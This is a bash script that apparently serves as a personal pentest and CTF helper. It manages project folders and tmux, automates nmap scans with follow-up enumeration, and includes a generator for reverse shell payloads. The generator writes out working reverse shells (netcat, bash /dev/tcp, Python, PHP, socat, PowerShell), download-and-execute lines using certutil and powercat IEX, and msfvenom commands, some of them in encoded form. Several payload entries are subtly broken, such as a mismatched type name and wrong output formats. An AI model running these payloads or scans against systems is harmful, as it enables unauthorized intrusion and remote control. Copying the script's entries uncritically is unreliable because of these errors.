#!/usr/bin/env bash
# Personal bash project manager + CTF / pentest assistant

set -euo pipefail

# ---- Config ----

BASE_DIR="/opt/anx/projects"
CURRENT_LINK="${HOME}/current"
VPN_INTERFACE="tun0"
ARCHIVE_DIR="${BASE_DIR}/archive"
DEFAULT_HTTP_PORT=8000

SCREENSHOT_TOOL="flameshot"
PREFERRD_FILEMANAGER="ranger"     # change to manager of choosing: vim, mc, etc.
PREFERRED_EDITOR="code"           # fallback: vnote, typora, etc.

mkdir -p "$BASE_DIR" "$ARCHIVE_DIR"

# ---- Output Helpers ----

red=$(tput setaf 1)
green=$(tput setaf 2)
yellow=$(tput setaf 3)
reset=$(tput sgr0)

msg_ok()    { echo "${green}[+]${reset} $*" ; }
msg_info()  { echo "${yellow}[*]${reset} $*" ; }
msg_err()   { echo "${red}[!]${reset} $*" >&2 ; }

# ---- Usage ----

usage() {
  cat <<'EOF'
Personal Project / CTF / Pentest Manager

Usage:
  init [--force] [--no-relink] <name>     Create standard project
  pen  [--force] [--no-relink] <name>     Create pentest project (zip template)
  link <name>                             Link existing project to ~/current
  list                                    List projects (* = current)
  edit                                    Open current project in editor
  shot                                    Flameshot → assets/ + link in notes.md
  archive                                 Zip current project → archive/
  ip                                      Show VPN IP (tun0 fallback eth0)
  host <ip> <hostname>                    Add/update /etc/hosts entry
  serve [port]                            Python HTTP server in ./tmp
  scope <ip/range>                        Append to scope.txt
  note <text>                             Append timestamped line to notes.md
  tmux                                    Launch pre-configured tmux layout
  cap                                     Save visible pane to logs/term/
  hist                                    Save full scrollback to logs/term/
  scan [--udp] <ip> [name]                Deep nmap + smart follow-ups
  sync <ip>                               Sync time to DC, otherwise set-ntp true
  rdp <ip> <user> <pass>                  Quick xfreerdp with dynamic res
  rev <type> [lhost] <port>               Generate reverse shell / payload string

Options:
  --force      Reuse existing directory
  --no-relink  Create project without changing ~/current
  --udp [-u]   Add top-1000 UDP scan (with scan command)
EOF
}

# ---- Helper Functions ----

safe_link() {
  local target="$1" link="$2"
  if [[ -e "$link" && ! -L "$link" ]]; then
    msg_err "$link exists and is not a symlink. Move/rename it first."
    exit 1
  fi
  ln -sfn "$target" "$link"
  msg_ok "Symlink updated: $link → $target"
}

ensure_file() {
  local path="$1" default_content="${2:-}"
  [[ -e "$path" ]] && return
  mkdir -p "$(dirname "$path")"
  printf '%s\n' "$default_content" > "$path"
}

require_current_project() {
  if [[ ! -L "$CURRENT_LINK" ]]; then
    msg_err "No active project (~/current not a symlink). Use init or link."
    exit 1
  fi
  CURRENT_PROJECT="$(readlink -f "$CURRENT_LINK")"
}

ensure_in_tmux() {
  if [[ -z "${TMUX:-}" ]]; then
    msg_err "This command must be run inside tmux."
    exit 1
  fi
}

# regex to strips colour codes
strip_ansi() {
  sed -r 's/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g'
}

get_vpn_ip() {
  local ip
  ip=$(ip -4 addr show "$VPN_INTERFACE" 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || true)
  if [[ -z "$ip" ]]; then
    ip=$(ip -4 addr show eth0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || echo "127.0.0.1")
    msg_err "$VPN_INTERFACE not found → fallback: $ip"
  fi
  echo "$ip"
}

# ---- Project Management ----

init_generic() {
  local mode="$1" ; shift
  local force=0 norelink=0 name=""
  base_zip="$BASE_DIR/template.zip"

  while [[ $# -gt 0 ]]; do
    case "$1" in
      -f|--force)     force=1    ; shift ;;
      --no-relink)    norelink=1 ; shift ;;
      -h|--help)      usage ; exit 0 ;;
      *)              name="$1"  ; shift ;;
    esac
  done

  [[ -z "$name" ]] && { msg_err "Project name required"; exit 1; }

  local proj="$BASE_DIR/$name"

  if [[ -d "$proj" ]]; then
    (( force )) || { msg_err "$proj already exists. Use --force"; exit 1; }
  else
    mkdir -p "$proj"
  fi

  if [[ "$mode" == "pen" && -f "$base_zip" ]]; then
    msg_info "Extracting base template from $base_zip..."
    unzip -q -o "$base_zip" -d "$proj"
  else
    if [[ "$mode" == "pen" ]]; then
      msg_err "Base template not found, falling back to standard structure."
    fi
    mkdir -p "$proj"/{logs/{term,nmap},assets,tmp,loot}
    ensure_file "$proj/scope.txt"
    ensure_file "$proj/notes.md" "# Notes"
  fi

  if (( norelink == 0 )); then
    safe_link "$proj" "$CURRENT_LINK"
    msg_ok "Project ready → $proj"
  else
    msg_ok "Project created (no symlink change) → $proj"
  fi
}

init_project()  { init_generic "standard" "$@"; }

link_project() {
  local name="${1:-}"
  [[ -z "$name" ]] && { msg_err "Project name required"; exit 1; }
  local proj="$BASE_DIR/$name"
  [[ -d "$proj" ]] || { msg_err "$proj does not exist"; exit 1; }
  safe_link "$proj" "$CURRENT_LINK"
}

list_projects() {
  shopt -s nullglob
  for d in "$BASE_DIR"/*; do
    [[ -d "$d" ]] || continue
    local mark=""
    if [[ -L "$CURRENT_LINK" ]] && [[ "$(readlink -f "$CURRENT_LINK")" == "$(readlink -f "$d")" ]]; then
      mark=" *"
    fi
    echo "$(basename "$d")$mark"
  done
}

archive_project() {
  require_current_project
  command -v zip >/dev/null 2>&1 || { msg_err "'zip' not found – install it"; exit 1; }

  local name="$(basename "$CURRENT_PROJECT")"
  local ts=$(date +%Y%m%d)
  local zipfile="$ARCHIVE_DIR/${name}_${ts}.zip"

  msg_info "Creating archive → $zipfile"
  if (cd "$BASE_DIR" && zip -s 20m -r -q "$zipfile" "$name" -x "*tmp*"); then
    msg_ok "Archive created: $zipfile"
  else
    msg_err "Zip failed – aborting"
    exit 1
  fi
}

# ---- Editors and Screenshots

open_editor() {
  require_current_project
  if command -v "$PREFERRED_EDITOR" &>/dev/null; then
    msg_ok "Opening in $PREFERRED_EDITOR..."
    "$PREFERRED_EDITOR" "$CURRENT_LINK" &>/dev/null &
  elif command -v typora &>/dev/null; then
    msg_ok "Opening in Typora..."
    vnote "$CURRENT_PROJECT" &>/dev/null &
  else
    msg_err "No supported GUI editor found"
  fi
}

take_screenshot() {
  require_current_project
  command -v "$SCREENSHOT_TOOL" >/dev/null || { msg_err "$SCREENSHOT_TOOL not installed"; exit 1; }

  local dir="$CURRENT_PROJECT/assets/screenshots"
  mkdir -p "$dir"
  local file="$dir/$(date +%Y%m%d-%H%M%S).png"
  local rel="assets/screenshots/$(basename "$file")"

  "$SCREENSHOT_TOOL" gui -p "$file" || { msg_info "Flameshot canceled"; return; }

  echo -e "\n![screenshot]($rel)" >> "$CURRENT_PROJECT/notes.md"
  msg_ok "Screenshot saved → $file"
  msg_ok "Linked in notes.md"
}

# ---- Tmux Helpers ----

launch_tmux_session() {
  require_current_project
  local session="pentest"
  if tmux has-session -t "$session" 2>/dev/null; then
    if [[ -n "${TMUX:-}" ]]; then
      tmux switch-client -t "$session"
    else
      tmux attach -t "$session"
    fi
    return
  fi
  # Create main window and split it vert
  tmux new-session -d -s "$session" -n "main" -c "$CURRENT_PROJECT"
  tmux split-window -v -t "$session:main"  -c "$CURRENT_PROJECT"
 
  tmux new-window -d -t "$session:" -n "scans" -c "$CURRENT_PROJECT"

  tmux new-window -d -t "$session:" -n "proxy" -c "/tmp"
  tmux split-window -v -t "$session:proxy"  -c "$CURRENT_PROJECT/tmp"

  tmux new-window -d -t "$session:" -n "vpn" -c "$HOME/Downloads"
 
  tmux select-window -t "$session:main"
  if [[ -n "${TMUX:-}" ]]; then
    tmux switch-client -t "$session"
  else
    tmux attach -t "$session"
  fi
}

capture_pane() {
  require_current_project
  ensure_in_tmux
  local dir="$CURRENT_PROJECT/logs/term"
  mkdir -p "$dir"
  local ts=$(date +"-%F")
  read -r -p "Enter a file name: " fn
  local out="$dir/${fn}${ts}_pane.txt"
  tmux capture-pane -p | strip_ansi > "$out"
  msg_ok "Pane captured → $out"
}

capture_history() {
  require_current_project
  ensure_in_tmux
  local dir="$CURRENT_PROJECT/logs/term"
  mkdir -p "$dir"
  local ts=$(date +"%F-%H%M%S")
  local out="$dir/${ts}_history.txt"
  tmux capture-pane -p -S - | strip_ansi > "$out"
  msg_ok "Full history captured → $out"
}

# ---- Quick Commands ----

# Adds or appeneds entries to /etc/hosts
add_host_entry() {
  if [[ $# -ne 2 ]]; then
    echo "Usage: host <ip> <hostname>"
    return 1
  fi
  local ip="$1" hostname="$2" hosts="/etc/hosts"

  if grep -q "[[:space:]]$hostname" "$hosts"; then
    msg_info "Removing old entry for $hostname"
    sudo sed -i "/[[:space:]]$hostname/d" "$hosts"
  fi

  if grep -q "^${ip}[[:space:]]" "$hosts"; then
    msg_info "Appending $hostname to existing $ip line"
    sudo sed -i "/^${ip}[[:space:]]/ s/$/ $hostname/" "$hosts"
  else
    msg_info "Adding new entry"
    echo "$ip $hostname" | sudo tee -a "$hosts" >/dev/null
  fi
  grep "^${ip}" "$hosts"
}

start_http_server() {
  require_current_project
  local port="${1:-$DEFAULT_HTTP_PORT}"
  local srv_dir="$CURRENT_PROJECT/tmp"
  mkdir -p "$srv_dir"
  msg_ok "Serving $srv_dir on http://$(get_vpn_ip):$port/"
  (cd "$srv_dir" && python3 -m http.server "$port")
}

add_scope_item() {
  require_current_project
  local item="${1:-}"
  [[ -z "$item" ]] && { msg_err "IP/range required"; exit 1; }
  echo "$item" >> "$CURRENT_PROJECT/scope.txt"
  msg_ok "Added to scope.txt → $item"
}

quick_note() {
  require_current_project
  local text="${*:-}"
  [[ -z "$text" ]] && { msg_err "Note text required"; exit 1; }
  local ts=$(date +"%F %H:%M")
  echo -e "\n- **$ts**: $text" >> "$CURRENT_PROJECT/notes.md"
  msg_ok "Note added"
}

quick_rdp() {
  require_current_project
  command -v xfreerdp3 >/dev/null 2>&1 || { msg_err "xfreerdp not found"; exit 1; }
  [[ $# -ne 3 ]] && { echo "Usage: rdp <ip> <user> <pass>"; exit 1; }
  xfreerdp3 /v:"$1" /u:"$2" /p:"$3" /dynamic-resolution +auto-reconnect +clipboard /drive:neverlook,"$CURRENT_PROJECT/tmp"
}

sync_time() {
  require_current_project
  if [[ $# -ne 1 ]]; then
    sudo timedatectl set-ntp true
    { msg_info "DC IP required - Syncing to local"; exit 1; }
    return 1
  else
    local dcip="$1"
    sudo timedatectl set-ntp false; sudo ntpdate -u "$dcip"
    msg_ok "Time synced to $dcip"
  fi
}

# --- Recon Functions ---

scan_target() {
  require_current_project
  local udp=0
  local ip=""
  local log_name=""

  while [[ $# -gt 0 ]]; do
    case "$1" in
      -u|--udp) udp=1; shift ;;
      *)
        if [[ -z "$ip" ]]; then
          ip="$1"
        else
          log_name="$1"
        fi
        shift
        ;;
    esac
  done

  [[ -z "$ip" ]] && { msg_err "Target IP required"; exit 1; }
  [[ -z "$log_name" ]] && log_name="$ip"

  local proj
  proj="$(readlink -f "$CURRENT_LINK")"
  local log_dir="$proj/logs/$log_name"
  mkdir -p "$log_dir"

  # --- Tmux Setup ---
  local sess
  sess=$(tmux display-message -p '#S')

  if ! tmux list-windows -t "${sess}:" | grep -q "scans"; then
    tmux new-window -t "${sess}:" -n "scans" -c "$proj"
    msg_ok "Created 'scans' window for background tasks."
  fi

  # Target the 'scans' window explicitly
  local target_win="${sess}:scans"

  # --- TCP Fast Scan ---
  msg_info "Starting Fast TCP Scan on $ip..."
  nmap -Pn -n -v --min-rate 500 --max-retries 1 -p- -oG "$log_dir/all_ports.gnmap" "$ip" # > /dev/null

  # Parse the ports
  local ports
  ports=$(awk '/Ports:/ {for(i=1;i<=NF;i++) if($i~/open/) {split($i,a,"/"); out=out a[1]","}} END {sub(/,$/,"",out); print out}' "$log_dir/all_ports.gnmap")

  if [[ -z "$ports" ]]; then
    msg_err "No open TCP ports found. (Try running standard nmap manually)"
    return
  fi

  msg_ok "Open TCP Ports: $ports"

  # --- TCP Deep Scan ---
  msg_info "Starting Version/Script Scan on active ports..."
  nmap -Pn -n -sCV -v -p "$ports" -oA "$log_dir/detailed" "$ip"

  local target_url="http://$ip"
  local redirect_url=""
  if [[ -f "$log_dir/detailed.nmap" ]]; then
    redirect_url=$(grep -oP 'Did not follow redirect to \Khttps?://[^/\s]+' "$log_dir/detailed.nmap" | head -n 1 || true)
  fi

  # HTTP Host Check
  if [[ -n "$redirect_url" ]]; then
    local clean_host="${redirect_url#*://}"
    local hostname="${clean_host%%:*}"

    msg_info "Detected redirect to URL: $redirect_url"
    read -p "[?] Add $ip $hostname to /etc/hosts? [Y/n] " -r ans
    if [[ "$ans" =~ ^[Yy]$ || -z "$ans" ]]; then
      add_host_entry "$ip" "$hostname"
      target_url="$redirect_url"
    fi
  fi

  # NFS Check
  if [[ ",$ports," == *",2049,"* ]]; then
      msg_ok "NFS detected!"
      # Showmount -e for finding exposed backups/configs
      showmount -e "$ip" | tee "$log_dir/nfs_shares.txt"
  fi

  # --- Prompt Actions ---

  # SNMP Check
  if [[ ",$ports," == *",161,"* ]]; then
      msg_ok "SNMP detected!"
      read -p "[?] Run onesixtyone to check for community strings? [Y/n] " -r ans
      if [[ "$ans" =~ ^[Yy]$ || -z "$ans" ]]; then
        msg_info "Spawning onesixtyone in 'scans' window..."      
        tmux split-window -t "$target_win" -c "$proj" \
        "onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $ip | tee $log_dir/snmp.txt"
      fi
  fi

  # Web Check
  if [[ ",$ports," =~ ,(80|443), ]]; then
    msg_ok "Web detected!"
    read -p "[?] Run wafw00f to check for firewalls? [Y/n] " -r ans
    if [[ "$ans" =~ ^[Yy]$ || -z "$ans" ]]; then
      msg_info "Running wafw00f..."
      wafw00f "$target_url" || msg_err "wafw00f failed or not installed"
    fi

    read -p "[?] Run aggressive HTTP scans (Feroxbuster/Wapiti)? [Y/n] " -r ans
    if [[ "$ans" =~ ^[Yy]$ || -z "$ans" ]]; then
      msg_ok "Spawning Ferox & Nuclei in 'scans' window..."
      
      tmux split-window -t "$target_win" -c "$proj" \
        "feroxbuster -u http://$ip --rate-limit 15 -t 10 -o $log_dir/ferox_$ip.txt; read"

      tmux split-window -t "$target_win" -c "$proj" \
        "wapiti -u $target_url -f txt -o $log_dir/wapiti.txt; read"
    else
      msg_info "Skipping HTTP scans."
    fi
  fi

  # SMB Check
  if [[ ",$ports," == *",445,"* ]] && grep -qi "microsoft-ds" "$log_dir/detailed.nmap"; then
    msg_ok "Windows SMB (microsoft-ds) detected!"
    read -p "[?] Run Enum4linux-ng? [Y/n] " -r ans
    if [[ "$ans" =~ ^[Yy]$ || -z "$ans" ]]; then
      tmux split-window -t "$target_win" -c "$proj" \
        "enum4linux-ng -A $ip -oA \"$log_dir/enum4linux_$ip\"; read"
    fi
  elif [[ ",$ports," == *",445,"* ]]; then
    msg_info "SMB detected but banner does not match 'microsoft-ds'. Likely Linux/Samba."
  fi
  
  # UDP Scan
  if (( udp == 1 )); then
    msg_info "UDP Scan requested. Prompting for sudo..."
    msg_info '[*] Starting UDP Top 1000...'
    sudo nmap -Pn -sU --top-ports 1000 -v -oA "$log_dir/udp_top1000_$ip" "$ip"
    msg_ok '[+] UDP Done'
  fi
  # Uncomment below to focus on scans
  # tmux select-layout -t "$target_win" tiled
}

# ---- Reverse Shell & Payload Generator ----

generate_payload() {
  local type="${1:-}"
  local encoder="omz_urlencode"
  shift || true


  # If type is 'list' or empty, show help
  if [[ -z "$type" || "$type" == "list" || "$type" == "-h" || "$type" == "--help" ]]; then
    cat <<EOF
Payload Generator Usage:
  annexes.sh rev <type> [lhost] <lport> [--b64|--url]

If [lhost] is omitted, it automatically falls back to your active VPN IP ($(get_vpn_ip)).

Modifiers (append at the end):
  --b64             Encode payload for Windows PowerShell (-enc / UTF-16LE)
  --url             URL encode the payload (python)

Available Types:
  #### Linux ####
  nc                 netcat traditional (mkfifo)
  nc-openbsd         netcat with -e flag
  bash               bash TCP interactive
  sh                 sh TCP interactive
  socat              socat TCP full tty 
  python             python3 one-liner
  php-exec           PHP fsockopen + exec
  php-proc           PHP proc_open variant
  msf-lin            msfvenom x64 shell_reverse_tcp (ELF)
  msf-met-lin        msfvenom x64 meterpreter stageless (ELF)

  #### Windows ####
  powercat           powercat.ps1 remote script injection (IEX)
  cmd                cmd reverse shell download + exec
  ps-tcp             powershell reverse shell one-liner by Nikhil
  msf-win            msfvenom x64 shell_reverse_tcp (EXE)
  msf-met-win        msfvenom x64 meterpreter stageless (EXE)
    
  #### Web ####
  bash-web           bash TCP interactive
  socat-web          socat full tty
  msf-aspx           msfvenom Windows x64 meterpreter aspx
  msf-php            msfvenom PHP meterpreter raw
  msf-jsp            msfvenom Java meterpreter raw
EOF
    return 0
  fi

  local lhost="" lport=""
  local encode_b64=0 encode_url=0

  # Parse arguments dynamically to handle [lhost]
  while [[ $# -gt 0 ]]; do
    case "$1" in
      --b64) encode_b64=1; shift ;;
      --url) encode_url=1; shift ;;
      *)
        if [[ -z "$lhost" && "$1" =~ ^[0-9]{1,3}(\.[0-9]{1,3}){3}$ ]]; then
          lhost="$1"
        elif [[ -z "$lport" && "$1" =~ ^[0-9]+$ ]]; then
          if [[ -z "$lhost" ]]; then
            lhost=$(get_vpn_ip)
            lport="$1"
          else
            lport="$1"
          fi
        else
          # Fallback check if it's just a port passed first
          lport="$1"
        fi
        shift
        ;;
    esac
  done

  # Fallback LHOST if only port was provided
  [[ -z "$lhost" ]] && lhost=$(get_vpn_ip)
  [[ -z "$lport" ]] && { msg_err "Port required. Usage: rev <type> [lhost] <lport>"; exit 1; }

  local payload=""
  case "$type" in
    nc-trad)
      echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lhost $lport >/tmp/f"
      ;;
    nc-openbsd)
      echo "nc -e /bin/sh $lhost $lport"
      ;;
    bash)
      payload="Shell: bash -i >& /dev/tcp/$lhost/$lport 0>&1"
      ;;
    bash-web)  
      payload="bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1';"
      ;;
    sh)
      payload="/bin/sh -i < /dev/tcp/$lhost/$lport > 0>&1 2>&1"
      ;;
    python)
      payload="python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
      ;;
    php-exec)
      payload="php -r '\$sock=fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
      ;;
    php-proc)
      payload="php -r '\$s=fsockopen(\"$lhost\",$lport);\$p=proc_open(\"/bin/sh\",array(0=>\$s,1=>\$s,2=>\$s),\$pipes);'"
      ;;
    msf-lin)
      payload="msfvenom -p linux/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f elf -o shell.elf"
      ;;
    msf-met-lin)
      payload="msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f elf -o met.elf"
      ;;
    msf-win)
      payload="msfvenom -p windows/x64/shell/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o shell.exe"
      ;;
    msf-met-win)
      payload="msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f aspx -o met.exe"
      ;;
    socat)
      echo -e "Listener:\nsocat file:`tty`,raw,echo=0 tcp-listen:$lport\n\nPayload:"
      payload="socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$lhost:$lport"
      ;;
    socat-web)
      echo -e "Listener:\nsocat file:`tty`,raw,echo=0 tcp-listen:$lport\n\nPayload:"
      payload="socat tcp-connect:$lhost:$lport exec:bash,pty,stderr,setsid,sigint"
      ;;
    msf-php)
      payload="msfvenom -p php/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -f raw > shell.php"
      ;;
    msf-aspx)
      payload="msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f aspx -o shell.aspx"
      ;;
    msf-jsp)
      payload="java/jsp_shell_reverse_tcp LHOST=$lhost LPORT=$lport -f raw -o shell.jsp"
      ;;
    powercat)
      payload="powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://$lhost:$DEFAULT_HTTP_PORT/powercat.ps1');powercat -c $lhost -p $lport -e cmd\""
      ;;
    cmd)
      echo -e "Generate Shell:\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o rev.exe\n\nPayload:"
      payload="certutil.exe -f -urlcache -split http://$lhost:$DEFAULT_HTTP_PORT/rev.exe c:\windows\temp\rev.exe && cmd.exe /c c:\windows\temp\rev.exe"
      ;;
    ps-tcp)
      payload="powershell -nop -c \"\$client = New-Object System.Net.Sockets.TCPClient('$lhost',$lport);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\""      ;;
    *)
      msg_err "Unknown payload type: $type. Run 'rev list' for options."
      exit 1
      ;;
  esac

  # Apply Encoding Modifiers if requested
  if (( encode_b64 )); then
    payload=$(echo -n "$payload" | iconv -t UTF-16LE | base64 | tr -d '\n')
    payload="powershell -enc $payload"
  elif (( encode_url )); then
    payload=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))")
  fi

  echo "$payload"
}

# ---- Dispatcher ----

main() {
  local cmd="${1:-}"
  shift || true

  case "$cmd" in
    init)     init_project  "$@" ;;
    pen)      init_generic "pen" "$@" ;;
    link)     link_project  "$@" ;;
    list)     list_projects     ;;
    edit)     open_editor       ;;
    shot)     take_screenshot   ;;
    archive)  archive_project   ;;
    ip)       get_vpn_ip        ;;
    host)     add_host_entry "$@" ;;
    serve)    start_http_server "$@" ;;
    scope)    add_scope_item "$@" ;;
    note)     quick_note    "$@" ;;
    tmux)     launch_tmux_session ;;
    cap)      capture_pane      ;;
    hist)     capture_history   ;;
    rdp)      quick_rdp     "$@" ;;
    scan)     scan_target "$@" ;;
    sync)     sync_time "$@" ;;
    rev)      generate_payload "$@" ;;
    -h|--help|"") usage ;;
    *) msg_err "Unknown command: $cmd"; usage; exit 1 ;;
  esac
}

main "$@"
